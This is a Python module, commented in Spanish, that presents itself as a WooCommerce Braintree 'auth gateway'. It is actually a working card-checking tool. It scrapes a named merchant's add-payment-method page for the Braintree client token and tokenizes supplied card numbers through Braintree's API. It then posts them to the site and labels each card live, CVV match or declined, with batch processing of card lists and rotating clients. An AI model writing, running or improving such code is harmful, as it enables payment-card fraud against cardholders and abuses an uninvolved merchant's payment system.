# woo_braintree_gateway.py - WooCommerce Braintree Auth Gateway (Cleaned & Blinded)
"""
GATEWAY: WooCommerce Braintree Auth
Mecanismo de autenticación a través de un frontend de WooCommerce que utiliza Braintree.
Versión mejorada con manejo robusto de errores y logging.
"""

import httpx
import re
import base64
import json
import time
import logging
from typing import Dict, Any, Optional, Tuple
from collections import defaultdict
from datetime import datetime

from gateway_helper import gateway_error_handler, RotationalClient

# Configurar logging
logger = logging.getLogger(__name__)

# ============================================
# 1. MEJORA: Rate limiter para gateway
# ============================================
class GatewayRateLimiter:
    """Rate limiter para el gateway Braintree."""
    
    def __init__(self, max_attempts: int = 20, window_seconds: int = 60):
        self.max_attempts = max_attempts
        self.window_seconds = window_seconds
        self.attempts = defaultdict(list)
    
    def is_allowed(self, identifier: str) -> Tuple[bool, int]:
        """Verifica si se puede hacer una solicitud."""
        now = time.time()
        self.attempts[identifier] = [
            t for t in self.attempts[identifier] 
            if now - t < self.window_seconds
        ]
        
        if len(self.attempts[identifier]) >= self.max_attempts:
            wait_time = int(self.window_seconds - (now - self.attempts[identifier][0]))
            return False, wait_time
        
        self.attempts[identifier].append(now)
        return True, 0

# Instancia global
gateway_rate_limiter = GatewayRateLimiter()

# ============================================
# 2. MEJORA: Parsing HTML más robusto
# ============================================
def parse_html(data: str, start: str, end: str) -> Optional[str]:
    """Función de parsing HTML mejorada y segura."""
    try:
        if not data or not start or not end:
            return None
        
        start_idx = data.index(start) + len(start)
        end_idx = data.index(end, start_idx)
        
        if start_idx < 0 or end_idx < start_idx:
            return None
        
        return data[start_idx:end_idx]
    except ValueError:
        logger.debug(f"Parsing HTML falló: start={start[:20]}..., end={end[:20]}...")
        return None
    except Exception as e:
        logger.error(f"Error en parsing HTML: {str(e)}")
        return None

# ============================================
# 3. MEJORA: Validación de tarjeta
# ============================================
def validate_card_data(cc: str, mes: str, ano: str, cvv: str) -> Tuple[bool, Optional[str]]:
    """Valida los datos de la tarjeta antes de enviar."""
    
    # Validar número
    if not cc.isdigit() or not (13 <= len(cc) <= 19):
        return False, "Número de tarjeta inválido"
    
    # Validar mes
    if not mes.isdigit() or not (1 <= int(mes) <= 12):
        return False, "Mes inválido"
    
    # Validar año
    if not ano.isdigit() or len(ano) not in [2, 4]:
        return False, "Año inválido"
    
    # Validar CVV
    if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
        return False, "CVV inválido"
    
    # Verificar fecha de expiración
    full_ano = f"20{ano}" if len(ano) == 2 else ano
    current_year = int(time.strftime("%Y"))
    current_month = int(time.strftime("%m"))
    
    if int(full_ano) < current_year or (int(full_ano) == current_year and int(mes) < current_month):
        return False, "Tarjeta expirada"
    
    return True, None

# ============================================
# 4. MEJORA: Clase Gateway mejorada
# ============================================
class WooCommerceBraintreeGateway:
    def __init__(self):
        self.client = RotationalClient(timeout=30.0, follow_redirects=True)
        self.target_site = "https://unpluggedperformance.com"
        self._token_cache: Dict[str, Tuple[str, float]] = {}
        self._token_cache_ttl = 300  # 5 minutos

    async def close(self):
        """Cierra el cliente HTTP."""
        try:
            await self.client.aclose()
            logger.info("Cliente HTTP cerrado correctamente")
        except Exception as e:
            logger.error(f"Error cerrando cliente HTTP: {str(e)}")

    @gateway_error_handler
    async def check_card(self, cc: str, mes: str, ano: str, cvv: str, **kwargs) -> Dict[str, Any]:
        """Verifica una tarjeta a través del gateway Braintree."""
        start_time = time.perf_counter()
        
        # Validar datos de tarjeta
        is_valid, error_msg = validate_card_data(cc, mes, ano, cvv)
        if not is_valid:
            logger.warning(f"Validación de tarjeta falló: {error_msg}")
            return {"status": "ERROR", "msg": f"VALIDATION $$ {error_msg}"}
        
        # Verificar rate limit
        allowed, wait_time = gateway_rate_limiter.is_allowed(cc[:6])
        if not allowed:
            return {"status": "ERROR", "msg": f"RATE_LIMIT $$ Espera {wait_time} segundos"}
        
        try:
            # PASO 1: Obtener nonces de login y pago
            add_payment_url = f"{self.target_site}/my-account/add-payment-method/"
            
            logger.debug(f"Obteniendo página de pago: {add_payment_url}")
            get_resp = await self.client.get(add_payment_url, **kwargs)
            
            if get_resp.status_code != 200:
                logger.error(f"Error obteniendo página: Status {get_resp.status_code}")
                return {"status": "ERROR", "msg": f"HTTP $$ Status {get_resp.status_code}"}
            
            payment_nonce = parse_html(get_resp.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            client_token_b64 = parse_html(get_resp.text, 'wc_braintree_client_token = ["', '"')
            
            if not client_token_b64:
                logger.error("No se pudo obtener el client_token de Braintree")
                return {"status": "ERROR", "msg": "FAIL $$ No se pudo obtener el client_token de Braintree."}
            
            # Decodificar token
            try:
                decoded_token = json.loads(base64.b64decode(client_token_b64))
                bearer = decoded_token.get('authorizationFingerprint')
                if not bearer:
                    raise ValueError("authorizationFingerprint no encontrado")
            except Exception as e:
                logger.error(f"Error decodificando token: {str(e)}")
                return {"status": "ERROR", "msg": "FAIL $$ El client_token de Braintree es inválido."}
            
            # PASO 2: Tokenizar la tarjeta
            graphql_headers = {
                "Authorization": f"Bearer {bearer}",
                "Braintree-Version": "2018-05-10",
            }
            graphql_payload = {
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": cc,
                            "expirationMonth": mes,
                            "expirationYear": f"20{ano}" if len(ano) == 2 else ano,
                            "cvv": cvv
                        }
                    }
                }
            }
            
            logger.debug("Enviando solicitud de tokenización a Braintree")
            gql_resp = await self.client.post(
                "https://payments.braintree-api.com/graphql",
                json=graphql_payload,
                headers=graphql_headers,
                **kwargs
            )
            
            if gql_resp.status_code != 200:
                logger.error(f"Error en GraphQL: Status {gql_resp.status_code}")
                return {"status": "DECLINED", "msg": f"BRAINTREE $$ Error HTTP {gql_resp.status_code}"}
            
            token_data = gql_resp.json()
            
            if "errors" in token_data or not token_data.get("data"):
                error_msg = token_data.get("errors", [{}])[0].get("message", "CARD DECLINED")
                logger.info(f"Tokenización falló: {error_msg}")
                return {"status": "DECLINED", "msg": f"BRAINTREE $$ {error_msg}"}
            
            braintree_token = token_data['data']['tokenizeCreditCard']['token']
            logger.debug("Tarjeta tokenizada correctamente")
            
            # PASO 3: Enviar el nonce al sitio
            form_data = {
                'payment_method': 'braintree_cc',
                'braintree_cc_nonce_key': braintree_token,
                'woocommerce-add-payment-method-nonce': payment_nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            }
            
            logger.debug("Enviando formulario de pago al sitio")
            post_resp = await self.client.post(add_payment_url, data=form_data, **kwargs)
            
            if post_resp.status_code != 200:
                logger.error(f"Error en POST: Status {post_resp.status_code}")
                return {"status": "DECLINED", "msg": f"HTTP $$ Status {post_resp.status_code}"}
            
            # PASO 4: Analizar respuesta
            final_html = post_resp.text
            elapsed = time.perf_counter() - start_time
            
            if 'Payment method successfully added' in final_html:
                logger.info(f"Tarjeta aprobada: {cc[:6]}... en {elapsed:.2f}s")
                return {"status": "APPROVED", "msg": "LIVE $$ Payment method added.", "time": f"{elapsed:.2f}s"}
            
            error_div = parse_html(final_html, '<div class="wc-block-components-notice-banner__content">', '</div>')
            if error_div:
                error_msg = error_div.strip()
                
                if 'Card Issuer Declined CVV' in error_msg:
                    logger.info(f"CVV mismatch: {cc[:6]}...")
                    return {"status": "SPECIAL", "msg": "CVV MISMATCH $$ Card Issuer Declined CVV", "time": f"{elapsed:.2f}s"}
                
                if 'Insufficient Funds' in error_msg:
                    logger.info(f"CVV match pero fondos insuficientes: {cc[:6]}...")
                    return {"status": "SPECIAL", "msg": "CVV MATCH $$ Insufficient Funds", "time": f"{elapsed:.2f}s"}
                
                logger.info(f"Tarjeta rechazada: {cc[:6]}... - {error_msg[:50]}")
                return {"status": "DECLINED", "msg": f"GATEWAY $$ {error_msg}", "time": f"{elapsed:.2f}s"}
            
            logger.warning(f"Respuesta desconocida del gateway para {cc[:6]}...")
            return {"status": "DECLINED", "msg": "DECLINED $$ Respuesta desconocida del gateway.", "time": f"{elapsed:.2f}s"}
            
        except httpx.TimeoutException as e:
            logger.error(f"Timeout en gateway: {str(e)}")
            return {"status": "ERROR", "msg": f"TIMEOUT $$ {str(e)}"}
        except httpx.RequestError as e:
            logger.error(f"Error de red en gateway: {str(e)}")
            return {"status": "ERROR", "msg": f"NETWORK $$ {str(e)}"}
        except Exception as e:
            logger.error(f"Error inesperado en gateway: {str(e)}", exc_info=True)
            return {"status": "ERROR", "msg": f"ERROR $$ {str(e)}"}

    async def check_card_batch(self, cards: list) -> list:
        """Verifica múltiples tarjetas en lote."""
        results = []
        for card in cards:
            try:
                cc, mes, ano, cvv = card.split('|')
                result = await self.check_card(cc, mes, ano, cvv)
                results.append(result)
            except Exception as e:
                logger.error(f"Error procesando tarjeta: {str(e)}")
                results.append({"status": "ERROR", "msg": str(e)})
        return results

# ============================================
# 5. MEJORA: Exportaciones
# ============================================
__all__ = [
    "WooCommerceBraintreeGateway",
    "validate_card_data",
    "parse_html",
    "gateway_rate_limiter"
]